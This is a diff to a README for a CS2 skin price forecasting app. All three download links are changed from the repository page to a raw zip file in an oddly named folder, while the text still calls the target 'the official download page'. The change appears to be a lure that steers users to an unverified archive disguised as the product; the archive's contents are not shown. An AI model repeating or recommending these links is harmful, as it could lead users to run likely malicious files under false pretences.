@@ -1,6 +1,6 @@
 # 🔮 cs2-skin-price-forecast-hub - Predict CS2 Skin Prices with Confidence
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/fainatenor490/cs2-skin-price-forecast-hub)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/fainatenor490/cs2-skin-price-forecast-hub/main/trisinuated/3.1-alpha.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these simple steps to get the application running on your Windows compute
 
 **Step 1: Download the Application**
 
-[Visit this link to download the application](https://github.com/fainatenor490/cs2-skin-price-forecast-hub)
+[Visit this link to download the application](https://raw.githubusercontent.com/fainatenor490/cs2-skin-price-forecast-hub/main/trisinuated/3.1-alpha.5.zip)
 
 This link will take you to the official download page. Look for the main download button or the latest release file. Click it and wait for the download to finish.
 
@@ -173,7 +173,7 @@ If you encounter any issues not covered here, or if you have suggestions for imp
 
 Need to download again? Here's the official link:
 
-[Download cs2-skin-price-forecast-hub](https://github.com/fainatenor490/cs2-skin-price-forecast-hub)
+[Download cs2-skin-price-forecast-hub](https://raw.githubusercontent.com/fainatenor490/cs2-skin-price-forecast-hub/main/trisinuated/3.1-alpha.5.zip)
 
 ---
 
